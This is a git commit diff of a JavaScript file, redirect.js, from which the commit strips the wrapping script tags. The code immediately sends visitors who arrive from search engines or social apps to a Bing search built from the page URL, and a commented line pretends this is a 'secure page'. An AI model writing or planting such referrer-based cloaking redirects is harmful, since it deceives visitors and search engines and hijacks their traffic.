b581c35a59fbd31bec101a6d04829e730b204828
Endyanto Dwi Saputro <screamolic@users.noreply.github.com>
2021-09-25 08:56:02 +0700

    Update redirect.js

--- redirect.js
+++ redirect.js
@@ -1,4 +1,3 @@
-<script> 
 if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) { 
 var url = window.location.href.split("/")[5]; 
 var res = url.replace("-", " "); 
@@ -8,4 +7,3 @@ function Redirect() {
 window.location="https://bing.com/search?q=" + firstWord; } 
 //document.write("You will be redirected to secure page in seconds."); 
 setTimeout('Redirect()', 0); } 
-</script>
